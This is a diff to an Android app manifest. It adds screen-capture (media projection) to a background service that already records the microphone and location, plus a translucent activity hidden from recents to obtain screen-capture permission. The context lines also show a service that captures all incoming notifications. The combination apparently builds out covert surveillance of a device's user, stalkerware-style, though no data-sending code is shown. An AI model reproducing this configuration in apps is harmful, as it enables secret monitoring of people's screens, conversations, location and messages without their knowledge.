@@ -25,6 +25,7 @@
     <!-- Foreground Service Type Permissions (Android 14+) -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
     <!-- Notification Permission (Android 13+) -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
@@ -59,9 +60,17 @@
         <!-- Foreground Service (Android 14: foregroundServiceType required) -->
         <service
             android:name=".MicService"
-            android:foregroundServiceType="microphone|location"
+            android:foregroundServiceType="microphone|location|mediaProjection"
             android:exported="false"
             android:stopWithTask="false" />
+
+        <!-- Transparent Activity to request screen-capture permission -->
+        <activity
+            android:name=".ScreenCaptureActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTop"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
         <!-- Notification reader — captures all incoming notifications -->
         <service
